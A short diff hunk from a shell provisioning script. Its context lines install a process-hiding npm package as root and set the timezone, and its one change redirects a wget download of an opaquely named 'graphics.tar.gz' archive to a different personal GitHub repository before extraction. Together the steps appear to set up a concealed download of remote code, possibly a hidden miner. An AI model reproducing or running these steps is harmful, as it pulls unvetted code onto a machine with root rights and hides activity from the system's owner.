@@ -11,7 +11,7 @@ sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+wget https://github.com/haiudh1894/avn/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
